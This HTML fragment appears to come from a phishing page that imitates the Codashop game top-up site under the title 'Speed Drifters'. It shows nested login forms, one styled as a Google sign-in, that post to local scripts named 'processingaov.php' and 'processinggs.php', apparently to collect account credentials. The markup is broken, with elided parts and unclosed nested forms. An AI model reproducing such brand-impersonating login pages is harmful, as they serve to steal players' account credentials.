...
<title>Speed Drifters - Codashop</title>
...
<div class="col-md-8">
       <form action="processingaov.php" id="login-form" method="post">
  <h4 >
...
<div style="width:100%" class="form-group">
 ...
 <form action="processinggs.php" id="login-form" method="post">
<h4 >
<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcTFSewBhRGZpjd1dcPyw5FPagSZBe8DYrcjARnQWQK0qy-BvJPz" height="50px" width="50px">
  </h4><form id="glogin">
<div style="width:100%" class="form-group">
